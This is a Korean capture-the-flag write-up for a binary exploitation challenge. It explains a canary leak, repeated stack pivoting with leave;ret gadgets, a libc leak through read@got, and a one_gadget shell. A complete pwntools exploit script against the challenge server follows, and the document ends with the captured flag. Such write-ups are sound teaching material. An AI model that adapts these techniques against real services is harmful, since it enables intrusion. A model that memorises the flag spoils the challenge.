```bash
[*] '/mnt/d/hk/_contest/2024JBU-CTF/control base/challenge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
pie가 꺼져있다.

프로그램은 단순하다. 첫 번째 입력을 받고, 출력하고 두 번째 입력을 받는다.
ROP를 할 수 있을 것 처럼 보이지만 0x38밖에 입력을 받지 않고, rbp - 0x20 부터 입력을 받는다. rbp - 0x8은 canary, rbp는 sfp이므로 실질적으로 페이로드로 사용할 수 있는 건 rbp - 0x20 ~ rbp - 0x8, rbp + 0x8 ~ rbp + 0x18 이다. 스택피보팅을 억지로 사용해서 rbp에 rbp - 0x28을, ret에 leave_ret 가젯을 넣고, rbp-0x20과 rbp-0x18에 원하는 작동, rbp-0x10에 Ret2main을 할 주소를 입력한다. 여기서 문제는 rbp - 0x28 값이 rbp에 들어가므로 이 부분에 정상적인 스택 주소가 있어야 한다는 것이다.
또 고려해야 할 것은 filter 함수의 실행이다. `mov rbp, rsp`를 실행하지 않는 곳으로 ret하면, rsp가 rbp 바로 밑에 있는 경우 read 다음에 filter가 실행되어 canary가 있는 곳이 변조되어 stack smashed가 뜨거나, 미리 짜놓았던 payload가 망가진다. 따라서 rbp는 항상 rsp랑 멀리 떨어져 있어야 한다.

일단 canary 값을 구하고, 손수 offset 노가다를 통해 어떤 스택 주소(`ss` 라 하자.)를 구한다.(dockerfile이 안 주어져서 리모트에서 직접 노가다해야 했다.) 그 다음에 `ss` + 0x100과 `ss` + 0x200 지역에 `ss` + 0x300 값을 입력해놓는다. 그러면 rbp-0x28에 `ss` + 0x300 값이 있도록 세팅하고, 여러 작동을 수행할 수 있다. 지금 rbp `ss` + 0x300에 있다면 `ss` + 0x200 이 되도록 하고, 이 왔다갔다를 반복한다. (마치 스택을 여기 쓰고 저기 갔다가 다시 여기 쓰고 저기 가고를 반복하는 것이다.)

```bash
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```
처음엔 pop_rdi 와 read_got, 그리고 main에서 printf 직전으로 돌아가 libc_base를 얻는다.
이제 원가젯을 사용하고자 한다. 이때 r12는 main 과정에서 쓰이지 않으므로, pop_r12, 0 을 통해 r12를 NULL로 만들고, pop_r15, 0, libc_base + 0xe3afe으로 one_gadget을 통해 쉘을 딴다.

이 때 위 과정에서 전체적으로 주의할 점은 printf와 system은 MOVAPS 이슈가 발생할 수 있기 때문에 이를 조심한다.

# Exploit code

```python
from pwn import *
from time import *

context.terminal = ["tmux", "splitw", "-h"]

# p = process('./challenge')
e = ELF('./challenge')
l = ELF('./libc-2.31.so')

pop_rdi = 0x00000000004013d3
bss = e.bss() + 0x500
leave_ret = 0x00000000004012a5
main = 0x4011d6
main_no_push_rbp = 0x4011db
ret = 0x000000000040101a

# gdb.attach(p)

p = remote('44.210.9.208', 10012)

p.sendafter(b'name : ', b'a' * 0x19)
p.recvuntil(b'a' * 0x19)
canary = u64(b'\x00' + p.recvn(7))
print(hex(canary))

payload = b'a' * 0x18 + p64(canary) + p64(bss) + p64(main_no_push_rbp)
p.sendafter(b'rename : ', payload)

p.sendafter(b'name : ', b'a' * 0x28)
p.recvuntil(b'a' * 0x28)
sfp = u64(p.recvn(6) + b'\x00' * 2) + 8
print(hex(sfp))

payload = p64(canary) * 4 + p64(sfp + 0x100) + p64(0x40126A)
p.sendafter(b'rename : ', payload)

payload = p64(sfp + 0x308) + p64(canary) * 3 + p64(sfp + 0x200) + p64(0x40126A)
sleep(1)
p.send(payload)
sleep(1)

payload = p64(sfp + 0x308) + p64(canary) * 3 + p64(sfp + 0x100 + 8) + p64(0x40126A)
sleep(1)
p.send(payload)
sleep(1)

payload = p64(pop_rdi) + p64(e.got['read']) + p64(0x401260) + p64(canary) + p64(sfp + 0x100 + 8 - 0x28) + p64(leave_ret)
sleep(1)
p.send(payload)
sleep(1)

l.address = u64(p.recvn(6).ljust(8, b'\x00')) - l.sym['read']
print(hex(l.address))

payload = p64(canary) * 4 + p64(sfp + 0x200 + 8) + p64(0x40126A)
sleep(1)
p.send(payload)
sleep(1)

pop_r12 = l.address + 0x000000000002f709
pop_r15 = 0x00000000004013d2
og = l.address + 0xe3afe

payload = p64(pop_r15) + p64(0) + p64(0x40126a) + p64(canary) + p64(sfp + 0x200 + 8 - 0x28) + p64(leave_ret)
sleep(1)
p.send(payload)
sleep(1)

payload = p64(pop_r12) + p64(0) + p64(og) + p64(canary) + p64(sfp + 0x308 - 0x28) + p64(leave_ret)
sleep(1)
p.send(payload)
sleep(1)

p.interactive()
```
`scpCTF{2yxlXCFpX8pbtcJAUpXY2gZlitfjBt}`